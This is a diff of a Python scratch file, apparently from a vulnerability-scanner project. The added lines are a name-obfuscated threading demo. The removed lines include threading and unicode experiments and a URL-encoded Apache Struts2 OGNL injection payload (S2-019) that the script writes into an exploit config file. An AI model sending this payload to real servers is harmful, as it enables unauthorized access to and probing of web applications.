@@ -1,82 +1,28 @@
-'''import queue,threading
-import time
-from plugin.util import *
+import queue as O000O00O00OO0OO00 ,threading as OOO00OOOOOOOO0O0O #line:1
+import time as O0O00O000O00O000O #line:2
+def test_aaa ():#line:3
+    __OO0O0OOOOOO0O0O0O =OOO00OOOOOOOO0O0O .Event ()#line:4
+    __OO0O0OOOOOO0O0O0O .set ()#line:5
+    __O000O0OO00OOO00OO =OOO00OOOOOOOO0O0O .Event ()#line:6
+    __O000O0OO00OOO00OO .set ()#line:7
+    def OOOO0OOOOOO0O0000 ():#line:10
+        while __O000O0OO00OOO00OO .isSet ():#line:11
+            __OO0O0OOOOOO0O0O0O .wait ()#line:12
+            print (1 )#line:13
+            O0O00O000O00O000O .sleep (1 )#line:14
+    print ('2秒暂停')#line:17
+    for OOO00O00OO0O00O0O in range (1 ):#line:18
+        print (OOO00O00OO0O00O0O )#line:19
+        OO000O000O00O0O0O =OOO00OOOOOOOO0O0O .Thread (target =OOOO0OOOOOO0O0000 )#line:20
+        OO000O000O00O0O0O .start ()#line:22
+    O0O00O000O00O000O .sleep (2 )#line:23
+    print ('2秒后重新开始')#line:24
+    __OO0O0OOOOOO0O0O0O .clear ()#line:25
+    O0O00O000O00O000O .sleep (2 )#line:26
+    print ('restart')#line:27
+    print ('2秒后停止')#line:28
+    O0O00O000O00O000O .sleep (2 )#line:30
+    __OO0O0OOOOOO0O0O0O .set ()#line:32
+    __O000O0OO00OOO00OO .clear ()
+#e9015584e6a44b14988f13e2298bcbf9
 
-
-#
-
-__flag = threading.Event()# 用于暂停线程的标识
-__flag.set()
-__running = threading.Event()# 用于停止线程的标识
-__running.set()# 将running设置为True
-def aa(dir):
-    while __running.isSet():
-
-
-        while not dir.empty():
-            __flag.wait()
-            print(dir.get())
-            time.sleep(1)
-
-print('2秒暂停')
-dir = get_dict('exploit/dir/dir.txt')
-for i in range(10):
-    print(i)
-    t = threading.Thread(target=aa,args=(dir,))
-
-    t.start()
-time.sleep(2)
-print('2秒后重新开始')
-__flag.clear()# 设置为False, 让线程阻塞
-time.sleep(2)
-print('restart')
-print('2秒后停止')
-#__flag.set()# 设置为True, 让线程停止阻塞
-time.sleep(2)
-
-__flag.set()# 将线程从暂停状态恢复, 如何已经暂停的话
-time.sleep(0.01)
-#__flag.set()
-dir.queue.clear()
-
-__running.clear()# 设置为False'''
-
-# import urllib.request
-#
-# user_agent = 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'
-# headers = {'User-Agent': user_agent}
-# a = urllib.request.Request('http://news.fjsen.com', headers=headers)
-# b = urllib.request.urlopen(a)
-# print(b.read().decode('utf-8'))
-
-c = '\\u53d1\\u751f\\u7684'.replace('\\\\', '\\')
-
-# b = '\u554a'
-# a = b.encode('utf-8').decode()
-# print(type('\u554a'))
-# print(a)
-'''
-import os, urllib, configparser
-import base64
-import codecs
-a = 'method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23path%3d%23req.getRealPath(%23parameters.pp[0]),%23w%3d%23res.getWriter(),%23w.print(%23parameters.web[0]),%23w.print(%23parameters.path[0]),%23w.print(%23path),1?%23xx:%23request.toString&pp=%2f&encoding=UTF-8&web=web&path=path%3a\n\n'
-config = configparser.ConfigParser()
-config.read('exploit/web/struts2/s2-019.conf')
-cf = config.sections()
-
-#a = base64.b64encode(a.encode('utf-8')).decode()
-#a = codecs.encode(a.encode('utf-8'), 'hex_codec').decode()
-print(a)
-for i in cf:
-    config.set(i, 'POST', a)
-config.write(open('exploit/web/struts2/s2-019.conf','w'))
-
-'''
-a = 'a'
-if a is not '':
-    print(1)
-
-head = {}
-head['a'] = 'b'
-head['b'] = 'c'
-print(head)
